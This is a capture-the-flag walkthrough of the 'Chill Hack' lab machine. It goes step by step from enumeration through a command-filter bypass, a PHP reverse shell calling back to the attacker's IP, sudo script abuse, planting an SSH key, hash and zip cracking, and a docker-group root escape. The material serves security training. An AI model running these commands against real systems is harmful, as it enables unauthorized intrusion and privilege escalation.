# Chill Hack
Scanning the service we get:
```
➜  ~ nmap -sV 10.10.21.180
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 10:21 CET
Nmap scan report for 10.10.21.180
Host is up (0.044s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
```

Trying to login to the FTP server using anonymous login is successful.
```
➜  ~ ftp 10.10.21.180
Connected to 10.10.21.180.
220 (vsFTPd 3.0.3)
Name (10.10.21.180:emil): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Here we find a file called `note.txt`.
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 .
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
```
Downloading the note and checking the contents:
```
ftp> get note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0,00253 seconds (34,7 kbytes/s)
ftp> quit
221 Goodbye.
➜  ~ cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Just browsing to the base ip, 
grants nothing but a fairly boring front page with no real functionallity.
No functionality = No vulnerbilities.
But according to the note we found, there should be somewhere, where we can execute commands.
Fuzzing for hidden directories with `gobuster` yields:
```
➜  ~ gobuster dir --url http://10.10.21.180/ --wordlist=/home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.21.180/
[+] Method:         GET
[+] Threads:        100
[+] Wordlist:       /home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Timeout:        10s
===============================================================
2020/12/09 10:33:23 Starting gobuster in directory enumeration mode
===============================================================
/css (Status: 301)            
/js (Status: 301)             
/images (Status: 301)          
/fonts (Status: 301)           
/secret (Status: 301)          
/server-status (Status: 403)     
                                  
===============================================================
2020/12/09 10:35:46 Finished
===============================================================
``` 
Hmmm a directory called `/secret`. That looks promising.
Going to the directory we're presented with a small form, `command`, and a submit button, `execute`.
Trying to execute `ls`, we get the intimidating response `Are you a hacker?`.
This must be the filtering they talked about.
Trying to execute `echo $(ls -la)` gives us a proper response.
So now we know just using `$(<command>)` bypasses their filtering. Sweet!
If we now setup a netcat listner on port 1234:
```
nc -lnvp 1234
```  
Find some reverse shell command online and execute it:

```
$(php -r '$sock=fsockopen("10.9.129.26",1234);exec("/bin/sh -i <&3 >&3 2>&3");')
```

Bingo, we have a shell!
```
➜  ~ nc -lnvp 1234
Connection from 10.10.21.180:38384
/bin/sh: 0: can't access tty; job control turned off
$
```
Running `whoami` shows that we're an unpriviledged user:
```
$ whoami
www-data
```
If we check if we have some `sudo`rights we see that:
```
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
Checking whats in `/home/apaar/.helpline.sh` we get:
```
$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```
Awesome, we're able to supply a message that gets evaluated and errors are redirected to `dev/null`.
This means that we can get code execution as the user `apaar`.
Now running the script as `apaar`:
```
$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!
```
We don't get asked the questions we expected, but we're still able to provide inputs

```
test
/bin/bash
```
After adding `/bin/bash`, we can test if we actually got a shell as `apaar`:
```
whoami
apaar
``` 

Sweet, we're now `apaar`! Our shell is quite fubar, 
so we can add ourselves(our own public ssh-key) to the `.ssh/authorized_keys` file and login with ssh:
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQhlkPFGyv/Vujc0Kk2iWmOg8RbEDDjfF4ZSnsPVitkZQYtRYlDdvcvHjV/QBvpmmbzsqAx8Ba5rJn1Lstk2k3Rmlpj8s2DEdBGp4KNzRxIpD7UGmZDBy2X+iKQCg/4OXe6NOkBPmmWp7bOxXEGWJIwPjMc5ZwdgUCGhLU8BLXihNZcqtJwXAGwptXSz4wq5Fzz/NH+jHgFcb/9cYClssLbin+BaDA6y5IplD9nAaj1m6YaoJJvrOM2kT+mBliSvuRGl4UjlFMk31lRcWYOON0x+Hx6XIrvYxKYDp+0LqD5gfT7fTQxBH42mRYIkE0mBtY18YExj9VdD6lsHORUPWOAZlaQr4FsjUn2ZqaGyTRFM+7pM1CfuE3EDHZ4N0vGG4MoSPcZFrSkcQ1Y5/30jQkdxHNCpX5UzyAf8IjhUCkeVfopFtMo58Rn0Hg8F/aaMjRISihJ4SMwOA2pZ5hCXh2hHiPvItPfkTErB4pRgDa6uLN0PxI4cr5hAB21+3xViE= emil@emil-244743g" >> /home/apaar/.ssh/authorized_keys
```
From a new terminal we can now login:
```
➜  ~ ssh apaar@10.10.21.180 
The authenticity of host '10.10.21.180 (10.10.21.180)' can't be established.
ECDSA key fingerprint is SHA256:ybdflPQMn6OfMBIxgwN4h00kin8TEPN7r8NYtmsx3c8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.21.180' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec  9 10:03:39 UTC 2020

  System load:  0.0                Processes:              110
  Usage of /:   24.9% of 18.57GB   Users logged in:        0
  Memory usage: 22%                IP address for eth0:    10.10.21.180
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.


Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
apaar@ubuntu:~$ 
```
Now we can find the user flag:
```
apaar@ubuntu:~$ ls -la
total 344
drwxr-xr-x 6 apaar apaar   4096 Dec  9 10:18 .
drwxr-xr-x 5 root  root    4096 Oct  3 04:28 ..
-rw------- 1 apaar apaar      0 Oct  4 14:14 .bash_history
-rw-r--r-- 1 apaar apaar    220 Oct  3 04:25 .bash_logout
-rw-r--r-- 1 apaar apaar   3771 Oct  3 04:25 .bashrc
drwx------ 2 apaar apaar   4096 Oct  3 05:20 .cache
drwxr-x--- 3 apaar apaar   4096 Dec  9 10:16 .config
drwx------ 4 apaar apaar   4096 Dec  9 10:20 .gnupg
-rwxrwxr-x 1 apaar apaar    286 Oct  4 14:11 .helpline.sh
-rwxrwxr-x 1 apaar apaar 300165 Dec  9 10:15 linpeas.sh
-rw-rw---- 1 apaar apaar     46 Oct  4 07:25 local.txt
-rw-r--r-- 1 apaar apaar    807 Oct  3 04:25 .profile
drwxr-xr-x 2 apaar apaar   4096 Oct  3 05:19 .ssh
-rw------- 1 apaar apaar    817 Oct  3 04:27 .viminfo
apaar@ubuntu:~$ cat local.txt
{USER-FLAG: <REDACTED>}
```
After searching for a while we find the directory `/var/www/files`.
Here we find a file called `index.php` which has the contents:
```
apaar@ubuntu:/var/www/files$ cat index.php 
<html>
<body>
<?php
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
?>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				<?php echo $success?>
                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```
Here we see some hardcoded credentials for the database!
```
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```
We can now login to the database using the user `root` and the password `!@m+her00+@db`:
```
apaar@ubuntu:/var/www/files$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
Listing the databases we get:
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)
```
The `webportal` database seems interesting.
Selecting the webportal database and showing the tables gets us:
```
mysql> use webportal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec
```

Showing what's in users may help us escalade our priviledges:
```
mysql> SELECT * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```
Sweet, some hashes. They look like MD5, so we should be able to crack them quickly.
Pasting them into crackstation.net gets us the passwords:
```
7e53614ced3640d5de23f111806cc4fd:masterpassword
686216240e5af30df0501e53c789a649:dontaskdonttell
```
We can now try to login as Anurodh or Aurick with the credentials found.
```
apaar@ubuntu:~$ su aurick 
Password: 
su: Authentication failure
apaar@ubuntu:~$ su anurodh 
Password: 
su: Authentication failure
```
Shit... no dice...
Maybe the other `.php` files may reveal something?
`Hacker.php` looks suspicious:
```
apaar@ubuntu:/var/www/files$ cat hacker.php 
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```
Hmmmm... "Look in the dark! You will find your answer". 
Has this turned into a stego challenge?
We can check the images for hidden messages.
First we setup a http server in the image folder:
```
apaar@ubuntu:/var/www/files$ cd images
```
Then we can use python to setup a simple http server:
```
apaar@ubuntu:/var/www/files/images$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We can then grab the two images in the folder:
```
wget http://10.10.21.180:8000/002d7e638fb463fb7a266f5ffc7ac47d.gif &&\
wget http://10.10.21.180:8000/hacker-with-laptop_23-2147985341.jpg
```
Using `steghide` we can check if the `.jpg` contains any hidden info.
Without using a passphrase, we get:
```
➜  /tmp steghide --info hacker-with-laptop_23-2147985341.jpg
"hacker-with-laptop_23-2147985341.jpg":                     
  format: jpeg
  capacity: 3,6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750,0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
``` 
Nice, we might have something here.
Extracting it gets us:
```
➜  /tmp steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```
Unzipping it gets us:
```
➜  /tmp unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password:
```
Hmmmm... Maybe we can use the credentials from the database here?
```
➜  /tmp unzip backup.zip                                
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
➜  /tmp unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
```
Shit, once again we're out of lock...
We might have to crack this ourselves.
```
➜  /tmp zip2john backup.zip > backup.hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
➜  /tmp john --wordlist=/home/emil/KaliLists/rockyou.txt backup.hash                                        
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
1g 0:00:00:00 DONE (2020-12-09 13:09) 3.571g/s 58514p/s 58514c/s 58514C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Jackpot!
Now we can unzip the backup and see what it contains:
```
➜  /tmp unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         
➜  /tmp cat source_code.php 
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
```
Nice another hardcoded password!
Decoding it reveals:
```
➜  /tmp echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd
```
Now we can try to switch users:
```
apaar@ubuntu:~$ su anurodh 
Password: 
anurodh@ubuntu:/home/apaar$ 
```
Yes! Finally!
Looking at which groups `anurodh` belongs to we get:
```
anurodh@ubuntu:~$ groups
anurodh docker
```
As a member of the docker group, we can easily get root access by running:
```
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
```
Now we only have to find the flag:
```
# ls /root
proof.txt
# cat /root/proof.txt


					{ROOT-FLAG: <REDACTED>}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
					|  Anurodh Acharya |
					---------------------

	               		     Let me know if you liked it.

Twitter
	- @acharya_anurodh
Linkedin
	- www.linkedin.com/in/anurodh-acharya-b1937116a
```
